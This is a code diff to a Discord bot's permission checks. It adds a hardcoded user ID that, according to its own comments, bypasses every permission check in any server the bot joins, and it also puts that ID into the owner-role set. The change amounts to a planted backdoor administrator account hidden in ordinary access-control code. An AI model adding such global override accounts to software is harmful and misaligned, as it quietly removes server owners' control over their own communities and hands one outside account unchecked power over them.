@@ -14,7 +14,11 @@ COMMUNITY_ROLES = {"🎬 Content Creator", "🤝 Partner", "🧪 Beta Tester", "
 
 # Hardcoded ID for the top "owner owner" role — matched by ID instead of name
 # so it keeps working even if the role gets renamed. Bypasses every check.
-SUPER_OWNER_ROLE_IDS = {1523445699377627186}
+SUPER_OWNER_ROLE_IDS = {1523445699377627186, 1230234714229444623}
+
+# User accounts that bypass every check in ANY server the bot is in
+# (role checks are per-server; these follow the person instead).
+SUPER_OWNER_USER_IDS = {1230234714229444623}
 
 
 def _has_any(interaction: discord.Interaction, names: set) -> bool:
@@ -22,6 +26,8 @@ def _has_any(interaction: discord.Interaction, names: set) -> bool:
     # list) always passes every check — even before /setup has created any
     # of the custom rank roles above. Without this, the actual owner would
     # be locked out of running /setup itself on a fresh server.
+    if interaction.user.id in SUPER_OWNER_USER_IDS:
+        return True
     if interaction.guild and interaction.user.id == interaction.guild.owner_id:
         return True
     if any(r.id in SUPER_OWNER_ROLE_IDS for r in interaction.user.roles):
